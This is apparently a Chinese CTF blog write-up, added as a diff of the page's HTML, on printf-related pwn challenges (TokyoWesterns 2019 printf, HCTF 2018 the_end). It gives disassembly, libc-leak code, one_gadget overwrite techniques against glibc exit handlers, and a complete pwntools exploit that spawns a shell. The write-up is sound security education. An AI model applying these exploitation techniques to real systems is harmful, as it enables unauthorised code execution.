@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,ctf," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="整理一下最近关于printf的非常规格式化字符串的题目。">
+<meta name="keywords" content="pwn,ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="printf pwn">
+<meta property="og:url" content="http://x3h1n.github.io/2019/09/03/printf-pwn/index.html">
+<meta property="og:site_name" content="X3h1n">
+<meta property="og:description" content="整理一下最近关于printf的非常规格式化字符串的题目。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://x3h1n.github.io/2019/09/03/printf-pwn/1.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/09/03/printf-pwn/2.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/09/03/printf-pwn/3.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/09/03/printf-pwn/4.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/09/03/printf-pwn/5.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/09/03/printf-pwn/6.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/09/03/printf-pwn/7.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/09/03/printf-pwn/8.png">
+<meta property="og:updated_time" content="2019-09-03T13:33:21.651Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="printf pwn">
+<meta name="twitter:description" content="整理一下最近关于printf的非常规格式化字符串的题目。">
+<meta name="twitter:image" content="http://x3h1n.github.io/2019/09/03/printf-pwn/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://x3h1n.github.io/2019/09/03/printf-pwn/"/>
+
+
+
+
+
+  <title>printf pwn | X3h1n</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">X3h1n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/09/03/printf-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="X3h1n">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">printf pwn</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-03T20:16:00+08:00">
+                2019-09-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>整理一下最近关于printf的非常规格式化字符串的题目。<br><a id="more"></a></p>
+<h1 id="TokyoWesterns-CTF-2019-printf"><a href="#TokyoWesterns-CTF-2019-printf" class="headerlink" title="TokyoWesterns CTF 2019 printf"></a>TokyoWesterns CTF 2019 printf</h1><h2 id="题目简述-amp-题目漏洞"><a href="#题目简述-amp-题目漏洞" class="headerlink" title="题目简述 &amp; 题目漏洞"></a>题目简述 &amp; 题目漏洞</h2><p>题目给了libc，libc版本是2.29：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Documents/pwn/2019/twctf/printf$ strings libc.so.6 | grep &quot;GNU C&quot;</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.29-0ubuntu2) stable release version 2.29.</span><br><span class="line">Compiled by GNU CC version 8.3.0.</span><br></pre></td></tr></table></figure></p>
+<p>开的保护情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Documents/pwn/2019/twctf/printf$ checksec printf</span><br><span class="line">[*] &apos;/home/ubuntu/Documents/pwn/2019/twctf/printf/printf&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>
+<p>题目自己实现了一个prinf函数，我们暂且命名为my_printf。<br>在my_printf函数中，程序会对输入的格式化字符串进行逐字符处理，F5根据伪C代码可以看到程序对于一些特殊格式的判断，但是程序滤掉了%n，我们无法通过常规的格式化字符串漏洞进行地址写。但是函数有一个alloca操作，alloca函数是从栈里面动态分配内存，在程序返回时该内存会自动释放掉。对应汇编里是抬高了栈顶，抬高的大小是rax，rax开始赋值为[rbp+var_150],这个地方在反编译后看的比较清楚，这个变量是一个计数器，当格式化字符串的字符不是“%”时，它就会加1。这样就可以通过控制格式化字符串来控制rsp的值。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000001</span>C5D                 mov     rax, [rbp+var_150]</span><br><span class="line">.text:<span class="number">0000000000001</span>C64                 lea     rdx, [rax+<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">0000000000001</span>C68                 mov     eax, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0000000000001</span>C6D                 sub     rax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000001</span>C71                 add     rax, rdx </span><br><span class="line">.text:<span class="number">0000000000001</span>C74                 mov     esi, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0000000000001</span>C79                 mov     edx, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001</span>C7E                 div     rsi</span><br><span class="line">.text:<span class="number">0000000000001</span>C81                 imul    rax, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0000000000001</span>C85                 sub     rsp, rax  <span class="comment">//here</span></span><br><span class="line">.text:<span class="number">0000000000001</span>C88                 mov     rax, rsp</span><br><span class="line">.text:<span class="number">0000000000001</span>C8B                 add     rax, <span class="number">0F</span>h</span><br><span class="line">.text:<span class="number">0000000000001</span>C8F                 shr     rax, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0000000000001</span>C93                 shl     rax, <span class="number">4</span></span><br></pre></td></tr></table></figure></p>
+<p>另外在my_printf函数最后会调用puts函数将输入的字符串输出，再输出时puts的参数是[rbp-0xd8]，它会在遍历格式化字符串时将其存储在[rbp-0xd8]中，那么其实这段空间的地址在最开始有一个赋值操作，[rbp-0xd8] = rax，这两段代码其实正好是连着的，rax在0x1C88时被赋值为rsp。所以我们可以通过格式化字符串长度来控制rax从而控制rsp至目标地址，将格式化字符串写入这个地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001C97                 mov     [rbp+var_D8], rax ; //here</span><br><span class="line">.text:0000000000001C9E                 mov     [rbp+var_D0.gp_offset], 8</span><br><span class="line">.text:0000000000001CA8                 mov     [rbp+var_D0.fp_offset], 30h ; &apos;0&apos;</span><br><span class="line">.text:0000000000001CB2                 lea     rax, [rbp+arg_0]</span><br><span class="line">.text:0000000000001CB6                 mov     [rbp+var_D0.overflow_arg_area], rax</span><br><span class="line">.text:0000000000001CBD                 lea     rax, [rbp+var_B0]</span><br><span class="line">.text:0000000000001CC4                 mov     [rbp+var_D0.reg_save_area], rax</span><br><span class="line">.text:0000000000001CCB                 mov     [rbp+idx], 0</span><br><span class="line">.text:0000000000001CD6                 mov     [rbp+var_140], 0</span><br><span class="line">.text:0000000000001CE1                 jmp     loc_2901</span><br></pre></td></tr></table></figure></p>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>开始要求输入name，长度为0x100，可以用来泄露libc基址、栈地址、程序基址和canary。<br><img src="/2019/09/03/printf-pwn/1.png" alt="1"><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##leak addr</span></span><br><span class="line">p.recvuntil(<span class="string">"What's your name?\n"</span>)</span><br><span class="line">payload = <span class="string">"%lx "</span> * ((<span class="number">0x100</span><span class="number">-4</span>)/<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">recv_data = p.recvuntil(<span class="string">"Do you leave a comment?\n"</span>,drop = <span class="keyword">True</span>)</span><br><span class="line">recv_data = recv_data.split(<span class="string">' '</span>)[<span class="number">-25</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">   recv_data[i] = int(recv_data[i],<span class="number">16</span>)</span><br><span class="line">stack = recv_data[<span class="number">0</span>]</span><br><span class="line">canary = recv_data[<span class="number">1</span>]</span><br><span class="line">code_base = recv_data[<span class="number">2</span>] - (<span class="number">0x555555556a40</span> - <span class="number">0x555555554000</span>)</span><br><span class="line">libc_base = recv_data[<span class="number">3</span>] - libc.symbols[<span class="string">"__libc_start_main"</span>] - <span class="number">235</span></span><br></pre></td></tr></table></figure></p>
+<p>再利用第二次输入来达到在指定地址写one_gadget的目的。这里利用的是exit函数里的rop，在libc_base+0x1e66c8处写了one_gadget，而这个地址在libc_base+4736f中被赋值给了rbx，然后在libc_base+0x47398处call [ebx]从而触发one_gadget。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000047368</span>                 cmp     byte ptr [rsp+<span class="number">48</span>h+var_3C], <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000004736</span>D                 jz      <span class="keyword">short</span> loc_473A3</span><br><span class="line">.text:<span class="number">000000000004736F</span>                 lea     rbx, off_1E66C8  <span class="comment">//rbx = heap_base+0x1e66c8</span></span><br><span class="line">.text:<span class="number">0000000000047376</span>                 lea     rax, unk_1E66D0</span><br><span class="line">.text:<span class="number">000000000004737</span>D                 cmp     rbx, rax</span><br><span class="line">.text:<span class="number">0000000000047380</span>                 jnb     <span class="keyword">short</span> loc_473A3</span><br><span class="line">.text:<span class="number">0000000000047382</span>                 lea     rax, off_1E66C8+<span class="number">7</span></span><br><span class="line">.text:<span class="number">0000000000047389</span>                 sub     rax, rbx</span><br><span class="line">.text:<span class="number">000000000004738</span>C                 shr     rax, <span class="number">3</span></span><br><span class="line">.text:<span class="number">0000000000047390</span>                 lea     r12, [rbx+rax*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">0000000000047395</span>                 nop     dword ptr [rax]</span><br><span class="line">.text:<span class="number">0000000000047398</span></span><br><span class="line">.text:<span class="number">0000000000047398</span> loc_47398:                              ; CODE XREF: sub_47170+<span class="number">231</span>↓j</span><br><span class="line">.text:<span class="number">0000000000047398</span>                 call    qword ptr [rbx]  <span class="comment">//call one_gadget</span></span><br><span class="line">.text:<span class="number">000000000004739</span>A                 add     rbx, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000004739</span>E                 cmp     rbx, r12</span><br><span class="line">.text:<span class="number">00000000000473</span>A1                 jnz     <span class="keyword">short</span> loc_47398</span><br></pre></td></tr></table></figure></p>
+<p>调试看的比较清楚，在程序偏移0x1c85处下断点，rax为0x8037420。<br><img src="/2019/09/03/printf-pwn/2.png" alt="2"><br>单步执行，程序栈顶抬高，栈顶变为0x7ffff7fc76a0，这个地址是libc_base(0x00007ffff7de1000)偏移0x1e66a0处。<br><img src="/2019/09/03/printf-pwn/3.png" alt="3"><br><img src="/2019/09/03/printf-pwn/4.png" alt="4"><br>然后rax被赋值为libc_base+0x1e66a0。最后在调用puts函数处下断点，libc_base+0x1e66c8处被写入了one_gadget。<br><img src="/2019/09/03/printf-pwn/5.png" alt="5"><br>最后在libc_base+0x47398调用处下断点，程序call [rbx]成功执行one_gadget。<br><img src="/2019/09/03/printf-pwn/6.png" alt="6"></p>
+<p>完整的exp我就不贴了，比赛时这道题看了半天也不会做，参考的是<a href="https://github.com/agadient/CTF/tree/master/tokyo" target="_blank" rel="noopener">这篇wp</a>。</p>
+<h1 id="De1CTF-2019-Unprintable（待补充）"><a href="#De1CTF-2019-Unprintable（待补充）" class="headerlink" title="De1CTF 2019 Unprintable（待补充）"></a>De1CTF 2019 Unprintable（待补充）</h1><h1 id="HCTF-2018-the-end"><a href="#HCTF-2018-the-end" class="headerlink" title="HCTF 2018 the_end"></a>HCTF 2018 the_end</h1><h2 id="题目简述-amp-amp-题目漏洞"><a href="#题目简述-amp-amp-题目漏洞" class="headerlink" title="题目简述 &amp;&amp; 题目漏洞"></a>题目简述 &amp;&amp; 题目漏洞</h2><p>逻辑比较简单，在开始会输出sleep函数的地址，从而泄露libc。<br>关闭了stdout和stderr，最后有5次写的机会，在每次循环中，先输入一个地址，然后可以在指定地址写一个字节，5次就是可以写5个字节。最后调用exit函数。<br>这里有两种解法：</p>
+<ol>
+<li>第一种利用的是exit函数中的一个gadget。</li>
+<li>第二种解法是程序在调用exit函数退出时会触发_IO_flush_all_lockp，刷新所有的文件指针，即遍历_IO_list_all链中的每一项会遍历IO_list_all，然后调用虚表里的某些函数，这个类似于我们在house of orange里让libc触发abort从而调用_IO_flush_all_lockp是一样的。</li>
+</ol>
+<h2 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h2><p>先通过sleep函数泄露libc：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##leak libc_base</span></span><br><span class="line">sleep_addr = p.recvuntil(<span class="string">', good luck'</span>,drop=<span class="keyword">True</span>).split(<span class="string">' '</span>)[<span class="number">-1</span>]</span><br><span class="line">libc_base = int(sleep_addr,<span class="number">16</span>) - <span class="number">0xcc230</span></span><br></pre></td></tr></table></figure></p>
+<p>程序在调用exit函数时会调用ld.so里的_dl_fini函数：<br><img src="/2019/09/03/printf-pwn/7.png" alt="7"><br>跟进_dl_fini函数_dl_fini+126处函数有一个操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7de7b3e &lt;_dl_fini+126&gt;:	call   QWORD PTR [rip+0x216404] # 0x7ffff7ffdf48 &lt;_rtld_global+3848&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/09/03/printf-pwn/8.png" alt="8"><br>这个地址0x7ffff7ffdf48与libc的偏移是0x5f0f48，可以将其覆写为one_gadget，但因为我们只能写5个字节，在未覆写之前，该处存储的值是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /8gx 0x7ffff7ffdf48</span><br><span class="line">0x7ffff7ffdf48 &lt;_rtld_global+3848&gt;:	0x00007ffff7dd7c90	0x00007ffff7dd7ca0</span><br><span class="line">0x7ffff7ffdf58 &lt;_rtld_global+3864&gt;:	0x00007ffff7deb0b0	0x0000000000000006</span><br><span class="line">0x7ffff7ffdf68 &lt;_rtld_global+3880&gt;:	0x0000000000000001	0x00007ffff7fde8e0</span><br><span class="line">0x7ffff7ffdf78 &lt;_rtld_global+3896&gt;:	0x0000000000000001	0x0000000000001000</span><br><span class="line">gdb-peda$ x /8gx 0x00007ffff7dd7c90</span><br><span class="line">0x7ffff7dd7c90 &lt;rtld_lock_default_lock_recursive&gt;:	0x2e6690c301044783	0x0000000000841f0f</span><br><span class="line">0x7ffff7dd7ca0 &lt;rtld_lock_default_unlock_recursive&gt;:	0x2e6690c301046f83	0x0000000000841f0f</span><br><span class="line">0x7ffff7dd7cb0 &lt;lookup_doit&gt;:	0x45c93145fb894853	0x8b4810ec8348c031</span><br><span class="line">0x7ffff7dd7cc0 &lt;lookup_doit+16&gt;:	0x00001047c7480877	0x480824548d480000</span><br></pre></td></tr></table></figure></p>
+<p>所以可以覆写低5个字节，然后触发one_gadget。<br>最后在调试的时候注意因为题目关了输出，所以本地只有发送一个“exec /bin/sh 1&gt;&amp;0”才会get shell，而且还是在开了socat的情况下成功get shell。<br>完整exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#context.terminal = ["tmux","split","-h"]</span></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">   p = process(<span class="string">"./the_end"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   p = remote(<span class="string">"127.0.0.1"</span>,<span class="number">23330</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##leak libc_base</span></span><br><span class="line">sleep_addr = p.recvuntil(<span class="string">', good luck'</span>,drop=<span class="keyword">True</span>).split(<span class="string">' '</span>)[<span class="number">-1</span>]</span><br><span class="line">libc_base = int(sleep_addr,<span class="number">16</span>) - <span class="number">0xcc230</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#call   qword ptr [rip + 0x216414] 0x7ffff7ffdf48 &lt;_rtld_global+3848&gt;</span></span><br><span class="line">target_addr = libc_base + <span class="number">0x5f0f48</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">   p.send(p64(target_addr+i))</span><br><span class="line">   p.send(p64(one_gadget)[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"exec /bin/sh 1&gt;&amp;0"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h2><h1 id="0x00-CTF-2017-left（待补充）"><a href="#0x00-CTF-2017-left（待补充）" class="headerlink" title="0x00 CTF 2017 left（待补充）"></a>0x00 CTF 2017 left（待补充）</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/agadient/CTF/tree/master/tokyo" target="_blank" rel="noopener">https://github.com/agadient/CTF/tree/master/tokyo</a><br><a href="https://www.cnblogs.com/hac425/p/9959748.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9959748.html</a><br><a href="https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/0x00ctf-2017/pwn/left-250" target="_blank" rel="noopener">https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/0x00ctf-2017/pwn/left-250</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/03/leetcode之其他/" rel="next" title="leetcode之其他">
+                <i class="fa fa-chevron-left"></i> leetcode之其他
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#TokyoWesterns-CTF-2019-printf"><span class="nav-number">1.</span> <span class="nav-text">TokyoWesterns CTF 2019 printf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目简述-amp-题目漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">题目简述 &amp; 题目漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用过程"><span class="nav-number">1.2.</span> <span class="nav-text">利用过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#De1CTF-2019-Unprintable（待补充）"><span class="nav-number">2.</span> <span class="nav-text">De1CTF 2019 Unprintable（待补充）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HCTF-2018-the-end"><span class="nav-number">3.</span> <span class="nav-text">HCTF 2018 the_end</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目简述-amp-amp-题目漏洞"><span class="nav-number">3.1.</span> <span class="nav-text">题目简述 &amp;&amp; 题目漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第一种解法"><span class="nav-number">3.2.</span> <span class="nav-text">第一种解法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二种解法"><span class="nav-number">3.3.</span> <span class="nav-text">第二种解法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-CTF-2017-left（待补充）"><span class="nav-number">4.</span> <span class="nav-text">0x00 CTF 2017 left（待补充）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
